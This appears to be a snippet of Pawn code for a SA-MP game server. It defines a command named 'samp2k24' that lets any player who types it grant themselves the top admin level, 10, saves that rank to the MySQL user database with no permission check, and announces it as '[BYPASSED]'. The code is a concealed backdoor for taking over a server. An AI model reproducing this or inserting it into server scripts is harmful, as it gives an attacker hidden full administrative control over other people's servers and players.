CMD:samp2k24(playerid, params[])
{
	new level = 10;

    PlayerInfo[playerid][pAdmin] = level;
    SM(playerid, COLOR_GREEN, "[BYPASSED] "WHITE"(Rank: %s) (Level: %i)", GetAdminRank(playerid), level);

	mysql_format(connectionID, queryBuffer, sizeof(queryBuffer), "UPDATE users SET adminlevel = %i WHERE uid = %i", level, PlayerInfo[playerid][pID]);
	mysql_tquery(connectionID, queryBuffer);
	return 1;
}